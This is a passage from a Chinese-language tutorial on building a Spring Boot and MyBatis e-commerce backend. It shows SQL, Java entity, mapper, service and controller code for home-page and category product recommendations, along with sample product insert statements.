punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="9-3-前端功能实现"><a href="#9-3-前端功能实现" class="headerlink" title="9.3 前端功能实现"></a>9.3 前端功能实现</h4><h2 id="十、首页-商品推荐"><a href="#十、首页-商品推荐" class="headerlink" title="十、首页-商品推荐"></a>十、首页-商品推荐</h2><h4 id="10-1-流程分析"><a href="#10-1-流程分析" class="headerlink" title="10.1 流程分析"></a>10.1 流程分析</h4><p><img src="imgs/1619334915995.png" alt="1619334915995"></p><h4 id="10-2-接口开发"><a href="#10-2-接口开发" class="headerlink" title="10.2 接口开发"></a>10.2 接口开发</h4><h6 id="10-2-1-数据库实现"><a href="#10-2-1-数据库实现" class="headerlink" title="10.2.1 数据库实现"></a>10.2.1 数据库实现</h6><blockquote><p>商品推荐算法：推荐最新上架的商品</p><p>说明：商品推荐算法是根据多个维度进行权重计算，计算出一个匹配值</p></blockquote><ul><li><p>数据表分析及数据准备</p></li><li><p>sql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 商品推荐：查询最新上架的商品</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product <span class="token keyword">order</span> <span class="token keyword">by</span> create_time <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">-- 子查询：根据商品id查询商品图片</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product_img <span class="token keyword">where</span> item_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在beans子工程entity包创建ProductVO,相比较Product新增了List<productimg> imgs用于存储商品的图片</productimg></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductVO</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductImg</span><span class="token punctuation">&gt;</span></span> imgs<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductImg</span><span class="token punctuation">&gt;</span></span> <span class="token function">getImgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> imgs<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setImgs</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductImg</span><span class="token punctuation">&gt;</span></span> imgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>imgs <span class="token operator">=</span> imgs<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Mapper接口定义操作方法：</p><ul><li>ProductMapper</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ProductMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Product</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ProductImgMapper</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ProductImgMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductImg</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token comment">//根据商品id查询当前商品的图片信息</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductImg</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectProductImgByProductId</span><span class="token punctuation">(</span><span class="token keyword">int</span> productId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置映射文件</p><ul><li>ProductMapper.xml</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ProductVOMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.ProductVO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>product_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>productId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>product_name<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>productName<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>categoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root_category_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rootCategoryId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sold_num<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>soldNum<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>product_status<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>productStatus<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>create_time<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TIMESTAMP<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>createTime<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>update_time<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TIMESTAMP<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateTime<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LONGVARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>imgs<span class="token punctuation">"</span></span> <span class="token attr-name">select</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.ProductImgMapper.selectProductImgByProductId<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>product_id<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectRecommendProducts<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ProductVOMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    select    product_id,    product_name,    category_id,    root_category_id,    sold_num,    product_status,    content,    create_time,    update_time    from product    order by create_time desc    limit 0,3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ProductImgMapper.xml</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.ProductImgMapper<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.entity.ProductImg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item_id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>itemId<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sort<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sort<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>is_main<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>isMain<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>created_time<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TIMESTAMP<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>createdTime<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updated_time<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TIMESTAMP<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updatedTime<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectProductImgByProductId<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    select      id,      item_id,      url,      sort,      is_main,      created_time,      updated_time    from product_img    where item_id=#{productId}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="10-2-2-业务层实现"><a href="#10-2-2-业务层实现" class="headerlink" title="10.2.2 业务层实现"></a>10.2.2 业务层实现</h6><ul><li><p>ProductService接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ProductService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ProductServiceImpl实现类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">ProductService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProductMapper</span> productMapper<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductVO</span><span class="token punctuation">&gt;</span></span> productVOS <span class="token operator">=</span> productMapper<span class="token punctuation">.</span><span class="token function">selectRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">,</span> productVOS<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="10-2-3-控制层实现"><a href="#10-2-3-控制层实现" class="headerlink" title="10.2.3 控制层实现"></a>10.2.3 控制层实现</h6><ul><li><p>IndexController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">ProductService</span> productService<span class="token punctuation">;</span><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/list-recommends"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"查询推荐商品接口"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> productService<span class="token punctuation">.</span><span class="token function">listRecommendProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="10-3-前端实现"><a href="#10-3-前端实现" class="headerlink" title="10.3 前端实现"></a>10.3 前端实现</h4><h2 id="十一、首页-分类商品推荐"><a href="#十一、首页-分类商品推荐" class="headerlink" title="十一、首页-分类商品推荐"></a>十一、首页-分类商品推荐</h2><blockquote><p>按照商品的分类（一级分类）推荐销量最高的6个商品</p></blockquote><h4 id="11-1-流程分析"><a href="#11-1-流程分析" class="headerlink" title="11.1 流程分析"></a>11.1 流程分析</h4><blockquote><p>加载分类商品推荐有两种实现方案：</p><p>方案一：当加载首页面时不加载分类的推荐商品，监听进度条滚动事件，当进度条触底（滚动指定的距离）就触发分类推荐商品的加载，每次只加载一个分类的商品。</p></blockquote><p><img src="imgs/1619402242681.png" alt="1619402242681"></p><blockquote><p>方案二：一次性加载所有分类的推荐商品，整体进行初始化。</p></blockquote><p><img src="imgs/1619402352603.png" alt="1619402352603"></p><h4 id="11-2-接口实现"><a href="#11-2-接口实现" class="headerlink" title="11.2 接口实现"></a>11.2 接口实现</h4><h6 id="11-2-1-数据库实现"><a href="#11-2-1-数据库实现" class="headerlink" title="11.2.1 数据库实现"></a>11.2.1 数据库实现</h6><ul><li><p>数据准备</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 添加商品</span><span class="token comment">-- 添加十个分类下的商品：</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'商品5'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'商品6'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'商品7'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'商品8'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'商品9'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'10'</span><span class="token punctuation">,</span><span class="token string">'商品10'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'11'</span><span class="token punctuation">,</span><span class="token string">'商品11'</span><span class="token 